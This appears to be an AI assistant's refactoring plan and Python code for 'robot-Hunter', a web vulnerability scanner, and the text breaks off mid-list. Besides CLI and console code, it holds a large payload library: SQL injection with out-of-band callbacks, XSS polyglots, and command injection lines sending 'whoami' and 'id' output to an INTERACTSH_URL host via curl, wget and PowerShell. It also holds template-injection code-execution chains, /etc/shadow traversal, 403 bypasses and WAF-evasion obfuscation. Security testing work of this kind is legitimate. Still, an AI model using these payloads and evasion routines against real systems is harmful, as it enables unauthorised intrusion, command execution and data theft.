
Here’s a breakdown of the improvements and the refactored code approach:

**Core Improvements:**

1.  **Enhanced Console Output (`rich`):** Replace basic `print` with `rich` for colorful, structured, and visually appealing console output, similar to professional tools. This addresses the "fancy" output request and reduces reliance on large log files for real-time info.
2.  **Command-Line Interface (`argparse`):** Introduce a proper CLI with arguments for target, depth, output, verbosity, rate limiting, etc., including a banner and help message (`-h`).
3.  **Payload Enhancement:**
    *   Consolidate payloads (likely in `smart_detector.py` or a new `payloads.py`).
    *   Add more diverse and modern payloads: SSTI (Server-Side Template Injection), NoSQL Injection, advanced XSS (polyglots, framework-specific bypasses), advanced SQLi (time-based, error-based, boolean-based, OOB), Header Injection, HTTP Parameter Pollution (HPP).
    *   Integrate Interactsh (or a similar OOB service) for confirming blind vulnerabilities.
4.  **WAF Evasion:**
    *   Expand header randomization (`smart_detector.py`).
    *   Implement more payload obfuscation techniques (character encoding, case variations, comments, null bytes where appropriate).
    *   Add basic HPP attempts.
    *   Implement custom path fuzzing for 403 bypasses.
5.  **403 Handling:**
    *   Centralize 403 handling logic.
    *   Implement custom bypass techniques *in Python* (path fuzzing, method switching, header injection) inspired by tools like `nomore403` or `bypass-403`, reducing reliance on external binaries initially. We can keep the *option* to call external tools but prioritize built-in logic.
6.  **Vulnerability Confirmation:** Move beyond simple string matching. Implement checks for time delays (blind SQLi/CMDi), specific error messages indicating syntax issues, reflections in the response (XSS), and OOB interactions.
7.  **Tool Integration (Conceptual):** While directly integrating external tools like Nuclei via subprocess is complex and requires installation, we can structure the output (like listing discovered endpoints) to make it *easy* to pipe into such tools. We *can* integrate `httpx` for faster initial probing.
8.  **Refactoring:**
    *   Streamline the roles of `attack_engine.py` and `smart_detector.py`. `SmartDetector` will handle evasion techniques, payload generation/obfuscation, and smart element detection. `AttackEngine` will orchestrate the attacks using these resources and focus on verification.
    *   Prioritize Playwright-based traffic analysis (`traffic_analyzer.py`) over Scapy (`network_analyzer.py`) for better integration and fewer privilege issues.
    *   Centralize findings reporting.
9.  **Focus:** Sharpen the focus on misconfiguration, information disclosure (error messages, source maps, comments, verbose APIs), and credential leaks (JS, comments, API responses).

**Implementation Strategy:**

We'll create a main script (`robot_hunter.py`), refactor existing classes, and add a utility for console output.

---

**New/Refactored Files (Conceptual Outline):**

*   **`robot_hunter.py` (New):** Main entry point, CLI parsing (`argparse`), banner, initializes and runs `SmartCrawler`.
*   **`console_manager.py` (New):** Utility using `rich` for all console output (status, findings, errors, banners).
*   **`payloads.py` (New/Consolidated):** Central repository for all attack payloads, categorized and potentially including generation logic.
*   **`smart_detector.py` (Refactored):** Focus on intelligent detection (elements, forms), WAF evasion techniques (headers, IP rotation), payload obfuscation/generation, response analysis helpers. *Removes direct payload lists*.
*   **`attack_engine.py` (Refactored):** Uses `payloads.py` and `smart_detector.py`. Orchestrates attacks (SQLi, XSS, CMDi, SSTI, Path Trav, etc.), handles 403 bypass attempts (custom logic first), performs vulnerability verification (time-based, OOB, error-based, reflection).
*   **`site_crawler.py` (Refactored):** Core crawling logic using Playwright. Integrates the refactored `AttackEngine`, `SmartDetector`, `AdvancedJSAnalyzer`, `TrafficAnalyzer`. Uses `ConsoleManager` for output. Coordinates the overall scan flow.
*   **`advanced_js_analyzer.py` (Minor Refactoring):** Ensure findings (like potential endpoints) are passed back effectively. Use `ConsoleManager`.
*   **`traffic_analyzer.py` (Minor Refactoring):** Ensure it captures necessary data via Playwright events and uses `ConsoleManager`.
*   **`report_generator.py` (Refactored):** Simplify, focus on generating structured data (JSON). Text report generation can be handled by `ConsoleManager` or kept minimal. Remove duplicated 403 logic.
*   **`requirements.txt` (Updated):** Add `rich`, `httpx` (optional but recommended). Remove `mitmproxy` if not used.
*   **`js_analyzer.py` (Static Analysis - Keep as is):** Useful for initial static checks. Integrate findings into the main report.
*   **`network_analyzer.py` (Deprecate/Optional):** Mark as optional or remove, favoring `traffic_analyzer.py`.
*   **`mitm_script.py` (Deprecate/Remove):** The Playwright approach is more integrated.

---

**Example Snippets (Illustrative):**

**`robot_hunter.py` (CLI and Banner):**

```python
import argparse
from rich.console import Console
from site_crawler import SmartCrawler
from console_manager import ConsoleManager
import asyncio
import time

def display_banner(console):
    banner = r"""
██████╗  ██████╗ ██████╗  ██████╗ ████████╗   ██╗   ██╗██╗   ██╗████████╗███████╗██████╗
██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝   ██║   ██║██║   ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██████╔╝██║   ██║   ██║      ██║   ██║██║   ██║   ██║   ███████╗██████╔╝
██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██║██║   ██║   ██║   ╚════██║██╔══██╗
██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║      ╚██████╔╝╚██████╔╝   ██║   ███████║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
                                Version 1.1 - Advanced Web Recon & Analysis
    """
    console.print(f"[bold cyan]{banner}[/bold cyan]")

def main():
    parser = argparse.ArgumentParser(description="Robot Hunter - Advanced Web Reconnaissance and Vulnerability Scanner")
    parser.add_argument("target", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("-o", "--output", help="Output file prefix for reports (JSON)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--rate-limit", type=int, default=10, help="Approximate requests per second (default: 10)")
    # Add more flags: --proxy, --headers, --cookies, --interactsh-url, --skip-js, etc.

    args = parser.parse_args()

    console = Console()
    display_banner(console)
    console_manager = ConsoleManager(console, verbose=args.verbose)

    console_manager.print_info(f"Starting scan against: [bold blue]{args.target}[/bold blue]")
    console_manager.print_info(f"Max Depth: {args.depth}, Rate Limit: ~{args.rate_limit}/s")
    if args.output:
        console_manager.print_info(f"Report file prefix: {args.output}")

    crawler = SmartCrawler(console_manager, max_depth=args.depth, rate_limit=args.rate_limit)
    report_generator = ReportGenerator(console_manager) # Pass console manager if needed

    start_time = time.time()
    try:
        # Run the main crawling and analysis asynchronously
        asyncio.run(crawler.start_crawl(args.target, report_generator))

        # --- Reporting Phase ---
        duration = time.time() - start_time
        console_manager.print_info(f"Scan finished in {duration:.2f} seconds.")

        report_generator.add_findings("crawler", crawler.get_findings())
        # Add findings from other components (JSAnalyzer, AttackEngine, etc.)
        # report_generator.add_findings("js_static", js_analyzer_results)
        # report_generator.add_findings("js_dynamic", advanced_js_analyzer_results)
        # report_generator.add_findings("attack_engine", attack_engine_results)
        # report_generator.add_findings("traffic", traffic_analyzer_results)


        report_generator.set_scan_target(args.target)
        report_generator.set_scan_duration(duration)
        report_generator.set_scan_status("completed")

        # Display summary on console
        summary = report_generator.generate_summary() # Make this method return the summary dict
        console_manager.print_summary(summary)

        # Generate file report if requested
        if args.output:
             report_generator.generate_report(args.output) # Generates JSON only now
             console_manager.print_info(f"JSON report saved to {args.output}.json")

    except KeyboardInterrupt:
        console_manager.print_warning("Scan interrupted by user.")
        report_generator.set_scan_status("interrupted")
        # Optionally generate partial report
    except Exception as e:
        console_manager.print_error(f"An unexpected error occurred: {e}", fatal=True)
        report_generator.set_scan_status("failed")
        # Optionally generate partial report with error info

if __name__ == "__main__":
    main()
```

**`console_manager.py`:**

```python
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.syntax import Syntax
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
import json

class ConsoleManager:
    def __init__(self, console: Console, verbose: bool = False):
        self.console = console
        self.verbose = verbose

    def print_info(self, message):
        self.console.print(f"[bold blue][*][/bold blue] {message}")

    def print_success(self, message):
        self.console.print(f"[bold green][+][/bold green] {message}")

    def print_warning(self, message):
        self.console.print(f"[bold yellow][!][/bold yellow] {message}")

    def print_error(self, message, fatal=False):
        prefix = "[bold red][ERROR][/bold red]" if fatal else "[bold red][-][/bold red]"
        self.console.print(f"{prefix} {message}")
        if fatal:
            exit(1) # Or raise a specific exception

    def print_verbose(self, message):
        if self.verbose:
            self.console.print(f"[dim][DEBUG] {message}[/dim]")

    def print_finding(self, finding_type, severity, details, url=""):
        color_map = {
            "CRITICAL": "bold red",
            "HIGH": "red",
            "MEDIUM": "yellow",
            "LOW": "cyan",
            "INFO": "blue"
        }
        severity_upper = severity.upper()
        color = color_map.get(severity_upper, "white")

        title = f"[{color}]{severity_upper}[/{color}] {finding_type}"
        content = f"[bold]URL:[/bold] {url}\n" if url else ""
        if isinstance(details, dict):
             # Pretty print dictionary details
             content += "\n".join(f"[bold]{k}:[/bold] {v}" for k, v in details.items())
        else:
             content += str(details)

        self.console.print(Panel(content, title=title, border_style=color, expand=False))

    def print_attack_attempt(self, url, method, payload_type, payload, status, is_vuln=False):
         status_color = "green" if status == 200 else "yellow" if status < 400 else "red"
         vuln_marker = "[bold magenta][VULN][/bold magenta]" if is_vuln else ""
         payload_display = payload[:80] + '...' if len(payload) > 80 else payload
         self.console.print(f"[cyan][ATTACK][/cyan] {method} {url} - Type: [yellow]{payload_type}[/yellow] - Payload: '{payload_display}' -> Status: [{status_color}]{status}[/{status_color}] {vuln_marker}")

    def print_summary(self, summary: dict):
        self.console.print("\n" + "="*30 + " [bold]Scan Summary[/bold] " + "="*30)

        table = Table(title="Findings by Severity")
        table.add_column("Severity", style="magenta")
        table.add_column("Count", style="cyan", justify="right")
        for sev, count in summary.get("by_severity", {}).items():
            if count > 0:
                table.add_row(sev.upper(), str(count))
        self.console.print(table)

        table = Table(title="Findings by Type")
        table.add_column("Type", style="magenta")
        table.add_column("Count", style="cyan", justify="right")
        # Sort by count descending
        sorted_types = sorted(summary.get("by_type", {}).items(), key=lambda item: item[1], reverse=True)
        for f_type, count in sorted_types:
             if count > 0:
                table.add_row(f_type, str(count))
        self.console.print(table)

        if summary.get("vulnerable_endpoints"):
             self.console.print("\n[bold yellow]Potentially Vulnerable Endpoints:[/bold yellow]")
             for ep in summary["vulnerable_endpoints"]:
                 self.console.print(f"- {ep}")
        # Add more summary sections (DB connections, services, etc.)

    def print_code(self, code, language="javascript", title="Code Snippet"):
        syntax = Syntax(code, language, theme="default", line_numbers=True)
        self.console.print(Panel(syntax, title=title, border_style="blue"))

    # Add methods for progress bars if needed for long operations
    def create_progress(self):
         return Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=self.console,
         )
```

**`attack_engine.py` (Refactored Snippet - 403 Handling & Verification):**

```python
import asyncio
import time
import random
import json
import httpx # Use httpx for direct requests
from urllib.parse import urlparse, urljoin

# Assuming payloads.py exists with payload dictionaries
from payloads import SQLI_PAYLOADS, XSS_PAYLOADS, CMD_PAYLOADS # etc.
# Assuming ConsoleManager is passed or accessible
# Assuming SmartDetector is passed or accessible (for obfuscation, headers)

class AttackEngine:
    def __init__(self, console_manager, smart_detector, interactsh_url=None):
        self.console = console_manager
        self.detector = smart_detector
        self.interactsh_url = interactsh_url # For OOB testing
        self.findings = []
        self.tested_endpoints = {} # Track tested endpoint+method+type to avoid repeats

    async def _make_request(self, client, url, method="GET", params=None, data=None, headers=None):
        """Helper to make requests with httpx, handling errors."""
        req_headers = await self.detector.get_next_user_agent_and_headers()
        if headers:
            req_headers.update(headers)

        try:
            self.console.print_verbose(f"Requesting: {method} {url} Params: {params} Data: {data}")
            response = await client.request(
                method,
                url,
                params=params,
                data=data,
                headers=req_headers,
                follow_redirects=True,
                timeout=15 # Adjust timeout
            )
            return response
        except httpx.RequestError as e:
            self.console.print_warning(f"Request failed for {url}: {e}")
            return None
        except Exception as e:
            self.console.print_error(f"Unexpected error during request to {url}: {e}")
            return None

    async def handle_forbidden(self, client, url: str) -> bool:
        """
        Attempts to bypass 403 Forbidden using custom techniques.
        Returns True if bypass seems successful, False otherwise.
        """
        self.console.print_warning(f"403 Detected for {url}. Attempting bypass techniques...")
        original_parsed = urlparse(url)
        base_url = f"{original_parsed.scheme}://{original_parsed.netloc}"
        path = original_parsed.path

        bypass_techniques = [
            # Path variations
            lambda p: p + '/',
            lambda p: '/' + p.strip('/'), # Ensure leading slash
            lambda p: p + '/.',
            lambda p: p + '/..;', # Sometimes works
            lambda p: p + '.json', # Check for API endpoints
            lambda p: p.upper(),
            lambda p: p.lower(),
            # Add more: url encoding variations (%2e), double slash, etc.

            # Method switching
            {"method": "POST"},
            {"method": "PUT"},
            {"method": "HEAD"},

            # Header injections (leverage SmartDetector's headers)
            {"headers": {"X-Original-URL": path}},
            {"headers": {"X-Rewrite-URL": path}},
            {"headers": {"X-Custom-IP-Authorization": "127.0.0.1"}}, # Common bypass
            # Add more headers from nomore403 lists if desired
        ]

        for tech in bypass_techniques:
            await asyncio.sleep(random.uniform(0.2, 0.5)) # Small delay
            current_url = url
            current_method = "GET"
            current_headers = None

            if callable(tech): # Path modification
                 new_path = tech(path)
                 current_url = urljoin(base_url, new_path)
                 if original_parsed.query:
                      current_url += "?" + original_parsed.query
                 self.console.print_verbose(f"Trying path bypass: {current_url}")
            elif isinstance(tech, dict): # Method or Header modification
                if "method" in tech:
                    current_method = tech["method"]
                    self.console.print_verbose(f"Trying method bypass: {current_method}")
                if "headers" in tech:
                    current_headers = tech["headers"]
                    self.console.print_verbose(f"Trying header bypass: {current_headers}")

            response = await self._make_request(client, current_url, method=current_method, headers=current_headers)

            if response and response.status_code != 403:
                 # Potential bypass! Log success. Might be 200, 404 (if path invalid), 401 etc.
                 self.console.print_success(f"Potential 403 Bypass FOUND for {url} -> {current_url} ({current_method}) - Status: {response.status_code}")
                 self.findings.append({
                     "type": "forbidden_bypass",
                     "severity": "HIGH",
                     "url": url,
                     "details": f"Bypassed using {tech} resulted in URL: {current_url}, Method: {current_method}, Status: {response.status_code}",
                     "response_status": response.status_code,
                 })
                 return True # Found a bypass

        self.console.print_info(f"No obvious 403 bypass found for {url} with basic techniques.")
        return False

    async def test_sqli(self, client, url, method="GET", params=None, data_template=None):
        """Tests for SQL Injection with verification."""
        endpoint_key = f"{method}:{url}:SQLI"
        if endpoint_key in self.tested_endpoints: return
        self.tested_endpoints[endpoint_key] = True

        self.console.print_info(f"Testing SQLi for: {method} {url}")
        base_params = params.copy() if params else {}
        base_data = data_template.copy() if data_template else {}

        # Iterate through parameters/data fields to inject
        target_fields = list(base_params.keys()) + list(base_data.keys())
        if not target_fields and method == "GET": # If no params, try injecting a common param name
             target_fields = ['id', 'query', 'search', 'param']
             base_params = {f: '1' for f in target_fields} # Add dummy base params

        for field in target_fields:
            original_value = base_params.get(field, base_data.get(field, '1')) # Default '1'
            self.console.print_verbose(f"Targeting field '{field}' for SQLi")

            # 1. Error-Based Check
            for payload in SQLI_PAYLOADS['error_based']:
                obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(1,2))
                test_val = str(original_value) + obfuscated_payload

                current_params = base_params.copy()
                current_data = base_data.copy()
                if field in current_params: current_params[field] = test_val
                if field in current_data: current_data[field] = test_val

                response = await self._make_request(client, url, method, params=current_params, data=current_data)
                if response:
                    is_vuln = self._verify_sqli_error(response)
                    self.console.print_attack_attempt(url, method, "SQLi-Error", test_val, response.status_code, is_vuln)
                    if is_vuln:
                        self.record_finding("sql_injection", "CRITICAL", {"field": field, "payload": payload, "verification": "Error Message"}, url)
                        # Optional: break if found for this field

            # 2. Time-Based Blind Check
            sleep_time = 7 # Seconds
            for payload_template in SQLI_PAYLOADS['blind_time']:
                payload = payload_template.replace("SLEEP_TIME", str(sleep_time))
                obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(1, 2))
                test_val = str(original_value) + obfuscated_payload

                current_params = base_params.copy()
                current_data = base_data.copy()
                if field in current_params: current_params[field] = test_val
                if field in current_data: current_data[field] = test_val

                start_time = time.time()
                response = await self._make_request(client, url, method, params=current_params, data=current_data)
                duration = time.time() - start_time

                if response:
                     is_vuln = duration >= sleep_time
                     self.console.print_attack_attempt(url, method, f"SQLi-Time(>{sleep_time}s)", test_val, response.status_code, is_vuln)
                     self.console.print_verbose(f"Time-based SQLi check duration: {duration:.2f}s")
                     if is_vuln:
                         self.record_finding("sql_injection_blind", "CRITICAL", {"field": field, "payload": payload, "verification": f"Time Delay ({duration:.2f}s)"}, url)
                         # Optional: break

            # 3. OOB Check (if interactsh configured)
            # ... (construct payload with interactsh URL, send request, check interactsh server)

    def _verify_sqli_error(self, response: httpx.Response) -> bool:
        """Checks response for common SQL error messages."""
        if not response: return False
        text = response.text.lower()
        errors = [
            "sql syntax", "mysql", "syntax error", "unclosed quotation mark",
            "pg_query()", "postgresql", "ora-", "oracle", "sqlite",
            "odbc driver", "invalid column name"
        ]
        return any(err in text for err in errors)

    def record_finding(self, type, severity, details, url):
         finding = {
            "type": type,
            "severity": severity,
            "url": url,
            "details": details,
            "timestamp": time.time()
         }
         self.findings.append(finding)
         self.console.print_finding(type, severity, details, url) # Print immediately

    def get_findings(self):
        return self.findings

    # Add similar methods for test_xss, test_cmdi, test_ssti, test_path_traversal etc.
    # Remember to implement verification logic for each (reflection for XSS, time/OOB for CMDi, specific errors/behavior for SSTI)
```

**`requirements.txt`:**

```
playwright>=1.40.0
jsbeautifier>=1.14.9
# mitmproxy>=10.2.2  # Likely remove unless specifically needed
aiohttp>=3.9.1
typing-extensions>=4.8.0
rich>=13.0.0         # Added for console output
httpx[http2]>=0.25.0  # Added for direct requests (includes http2 support)
# Optional: nuclei, subfinder etc. would be installed separately, not via pip
```

**Next Steps:**

1.  **Implement the structure:** Create the new files (`robot_hunter.py`, `console_manager.py`, `payloads.py`).
2.  **Refactor:** Move logic according to the plan (payloads, 403 handling, console output).
3.  **Expand Payloads:** Populate `payloads.py` with comprehensive and categorized lists.
4.  **Implement Attack Methods:** Flesh out `attack_engine.py` with tests for XSS, CMDi, SSTI, Path Traversal, including verification logic (reflection, time-based, OOB, error patterns).
5.  **Integrate:** Ensure all components use `ConsoleManager` and pass findings correctly.
6.  **Test:** Run against vulnerable applications (like Juice Shop) to verify detection and output.

This revised structure makes `robot-Hunter` much more modular, powerful, and user-friendly, aligning it with modern bug bounty tooling practices. Remember to handle potential exceptions gracefully throughout the code.    

# CHANGES

Okay, let's implement the refactoring and enhancements for `robot-Hunter`.

This involves creating the new files, moving logic, adding payloads, implementing attack methods, and integrating everything with the new console manager.

**Note:** This is a significant refactoring. The code below provides the core structure and implementation for the key parts. You might need further refinement and testing, especially around edge cases and specific website behaviors.

---

**1. `requirements.txt` (Updated)**

```
playwright>=1.40.0
jsbeautifier>=1.14.9
# mitmproxy>=10.2.2  # Removed, using Playwright/httpx
aiohttp>=3.9.1
typing-extensions>=4.8.0
rich>=13.0.0         # Added
httpx[http2]>=0.25.0  # Added
# scapy - Removed, prefering Playwright/httpx analysis
```

---

**2. `payloads.py` (New)**

```python
# Payloads for various web vulnerabilities
# Categories help in selecting appropriate tests

# --- SQL Injection Payloads ---
SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "`", "');", "';", "\";", # Basic syntax breakers
        "' AND 1=CAST(@@VERSION AS INTEGER)--", # MSSQL Version Error
        "' AND 1=CONVERT(int, @@VERSION)--", # MSSQL Version Error Alt
        "' UNION SELECT @@VERSION--", # Generic Version (Might work)
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58),CHAR(118),CHAR(112),CHAR(117),CHAR(58),(SELECT (SLEEP(0))),CHAR(58),CHAR(100),CHAR(100),CHAR(111),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)--", # MySQL Error
        "' AND extractvalue(rand(),concat(0x3a,version()))--", # MySQL XPath Error
        "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH(USER)--", # Oracle Error
        "' AND 1=(select count(*) from all_tables where 1=1 and ROWNUM=1 and 1/0 = 1 )--", # Oracle Division by Zero
        "' AND 1=CAST(VERSION() AS INT)--", # PostgreSQL Type Error
        "' AND 1=CAST(PG_SLEEP(0) AS TEXT)--", # PostgreSQL Sleep (adjust time in engine)
        "' AND 1=JSON_OBJECT('sql',@@VERSION)--", # Check JSON support
    ],
    "blind_time": [
        "' AND SLEEP(SLEEP_TIME)--", # MySQL, MariaDB
        "'; WAITFOR DELAY '0:0:SLEEP_TIME'--", # MSSQL
        "' AND pg_sleep(SLEEP_TIME)--", # PostgreSQL
        "' AND dbms_lock.sleep(SLEEP_TIME)--", # Oracle (requires privileges)
        "' AND randomblob(SLEEP_TIME*100000000)--", # SQLite (approximate)
        "' OR IF(1=1, SLEEP(SLEEP_TIME), 0)--", # MySQL Conditional
        "' RLIKE SLEEP(SLEEP_TIME)--", # MySQL Regex Based
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(VERSION(),1,1)='5'--", # Check specific version char
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", # Check table existence
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97--", # Check specific character (adjust query)
    ],
    "union_based": [ # Need to determine column count first
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@VERSION,DATABASE(),USER()--", # Example Info Leak
    ],
    "oob": [ # Out-of-Band - Requires Interactsh or similar
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\', 'abc'))--", # MySQL UNC
        "'; EXEC xp_dirtree '\\\\INTERACTSH_URL\\test';--", # MSSQL xp_dirtree
        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--", # Oracle UTL_HTTP
        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--", # Oracle DNS
        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--", # PostgreSQL Program execution
    ],
     "waf_evasion": [
        "'/**/OR/**/1=1--",
        "'%09OR%091=1--", # Tab based
        "'%0AOR%0A1=1--", # Newline based
        "'/*!50000OR*/1=1--", # MySQL Versioned Comment
        "' UniON SeLeCt @@version --", # Case variation
        "'+UNION+ALL+SELECT+NULL,NULL,NULL--", # URL Encoded Space
        "%27%20OR%20%271%27=%271", # Full URL Encoding
    ]
}

# --- Cross-Site Scripting (XSS) Payloads ---
XSS_PAYLOADS = {
    "basic_reflection": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\" autofocus onfocus=alert(1)>", # Attribute injection
        "<details open ontoggle=alert(1)>", # HTML5 based
        "javascript:alert(1)", # For href/src attributes
    ],
    "html_injection": [
        "<h1>XSS</h1>", # Simple tag injection
        "<a href=//example.com>Click Me</a>", # Link injection
        "<plaintext>", # Breaks HTML parsing
    ],
    "attribute_injection": [
        "\" onmouseover=alert(1) \"",
        "' onerror=alert(1) '",
        "\" style=display:block;font-size:50px; onmouseover=alert(1)//", # CSS Breakout
    ],
    "filter_evasion": [
        "<scr<script>ipt>alert(1)</scr<script>ipt>", # Tag splitting
        "<img src=x oNeRrOr=alert(1)>", # Case variation
        "<svg/onload=&#97&#108&#101&#114&#116(1)>", # HTML Entities
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # Base64 eval
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", # Charcode eval
        "data:text/html,<script>alert(1)</script>", # Data URI
        "<a href=\"javas&#99;ript:alert(1)\">XSS</a>", # Partial entity
    ],
    "dom_based": [
        "#\"><img src=x onerror=alert(1)>", # Hash based injection target
        "javascript:window.location.hash='<img src=x onerror=alert(1)>'", # Triggering via hash change
        "eval(location.hash.slice(1))", # Needs sink in code
        "document.write(location.hash.slice(1))", # Needs sink in code
    ],
    "framework_specific": { # Often needs specific sinks
        "angular": ["{{constructor.constructor('alert(1)')()}}"],
        "vue": ["<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>"],
        "react": ["<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>"], # Needs specific prop usage
    },
     "polyglots": [ # Attempts to work in multiple contexts
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "-->'><svg/onload=alert(1)>",
        "\"'--></style></script><svg onload=alert(1)>",
        "'\"()><svg onload=alert(1)>",
    ],
}

# --- Command Injection Payloads ---
CMD_PAYLOADS = {
    "basic": [
        "; id", "& id", "| id", "&& id", "|| id", "`id`", "$(id)", # Linux/Unix
        "; whoami", "& whoami", "| whoami", "&& whoami", "|| whoami", # Linux/Unix
        "; dir", "& dir", "| dir", "&& dir", "|| dir", # Windows
        "; systeminfo", "& systeminfo", "| systeminfo", # Windows
    ],
    "blind_time": [
        "; sleep SLEEP_TIME", "& sleep SLEEP_TIME", "| sleep SLEEP_TIME", # Linux/Unix
        "& timeout /t SLEEP_TIME", "; timeout /t SLEEP_TIME", # Windows
        "$(sleep SLEEP_TIME)", "`sleep SLEEP_TIME`", # Command Substitution Linux
        "; ping -c SLEEP_TIME 127.0.0.1", # Linux Ping delay
        "& ping -n SLEEP_TIME 127.0.0.1 > NUL", # Windows Ping delay
    ],
    "oob": [ # Out-of-Band
        "; nslookup `whoami`.INTERACTSH_URL", # Linux DNS
        "& nslookup %USERNAME%.INTERACTSH_URL", # Windows DNS
        "; curl http://INTERACTSH_URL/`whoami`", # Linux HTTP
        "& powershell -Command \"(New-Object System.Net.WebClient).DownloadString('http://INTERACTSH_URL/'+$env:username)\"", # Windows PowerShell HTTP
        "| wget -O- --post-data=\"output=$(id | base64)\" http://INTERACTSH_URL/", # Linux Post Data
        "$(dig +short INTERACTSH_URL)", # Linux Dig DNS
    ],
    "filter_evasion": [
        ";${IFS}id", # Internal Field Separator Linux
        "; w`whoami`", # Nested backticks Linux
        "& C:\\Windows\\System32\\cmd.exe /c whoami", # Full Path Windows
        "; cat /e?c/p?sswd", # Wildcards Linux
        "& type C:\\Windows\\win.ini", # Alternative read command Windows
        "; exec('id')", # Using syscalls/alternatives (context dependent)
    ]
}

# --- Server-Side Template Injection (SSTI) Payloads ---
SSTI_PAYLOADS = {
    "basic_detection": [
        "${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", # Common syntaxes
        "{{'foo'.toUpperCase()}}", # Jinja2/Twig check
        "${'foo'.toUpperCase()}", # Freemarker check
        "<%= 'foo'.upcase %>", # Ruby ERB check
        "#{'foo'.upcase}", # Slim/Ruby check
        "[[${7*7}]]", # Thymeleaf check
    ],
    "common_vars": [ # Check for accessible variables/objects
        "{{config}}", "{{self}}", "{{settings}}", "${app}", "<%= request %>",
        "{{request.application.__globals__}}", # Flask/Jinja2 Globals
        "#{request.env}", # Ruby env
    ],
    "code_execution": { # Highly context-dependent, often needs chaining
        "jinja2": [
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
            "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
            "{{''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__.os.popen('id').read()}}", # Find Popen index
        ],
        "freemarker": [
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
        ],
        "velocity": [
            "#set($x = $context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter())#set($p = $x.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))#set($is = $p.getInputStream())#set($br = $x.getClass().forName('java.io.BufferedReader').getDeclaredConstructor($x.getClass().forName('java.io.InputStreamReader')).newInstance($is))#set($line = '')#set($null = $x.println('OUTPUT:'))#foreach($i in [1..9999])#set($line = $br.readLine())#if($line == $null)#break#end#set($null = $x.println($line))#end",
        ],
        "ruby_erb": [
            "<%= `id` %>",
            "<%= system('id') %>",
            "<%= IO.popen('id').read %>",
        ],
        "thymeleaf": [ # Often requires specific context/dialect setup
             "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
             "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.k", # Pre/Post processing trick
        ],
        "generic_oob": [ # Try to trigger OOB via common functions
             "{{ ''.__class__.__mro__[1].__subclasses__().pop(<INDEX>).read('http://INTERACTSH_URL') }}", # Python urlopen/requests?
             "${#rt = @java.lang.Runtime@getRuntime()}${rt.exec(\"nslookup INTERACTSH_URL\")}", # Java-based
        ]
    }
}

# --- Path Traversal Payloads ---
PATH_TRAVERSAL_PAYLOADS = {
    "common_files_unix": [
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/shadow", # Usually needs root
        "../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../etc/issue",
        "../../../../../../../../../../etc/motd",
        "../../../../../../../../../../proc/self/environ", # Check environment vars
        "../../../../../../../../../../proc/version",
        "../../../../../../../../../../var/log/apache2/access.log", # Example log file
        "../../../../../../../../../../var/www/html/config.php", # Example config
    ],
    "common_files_windows": [
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_exYYMMDD.log", # Example IIS log
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", # Older windows
